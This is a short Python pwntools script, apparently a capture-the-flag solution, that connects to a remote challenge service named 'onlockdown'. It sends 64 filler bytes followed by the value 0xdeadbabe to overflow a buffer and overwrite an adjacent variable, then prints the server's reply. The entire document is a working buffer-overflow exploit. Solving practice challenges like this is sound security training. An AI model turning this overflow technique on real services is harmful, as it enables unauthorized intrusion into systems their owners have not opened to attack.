from pwn import *

p = remote('ctf.umbccd.io', 4500)
# p = process('./onlockdown')

buf = b''
buf += b'a'*64
buf += p32(0xdeadbabe)

p.sendline(buf)
p.recvuntil('you?\n')
print(p.recvall().decode())
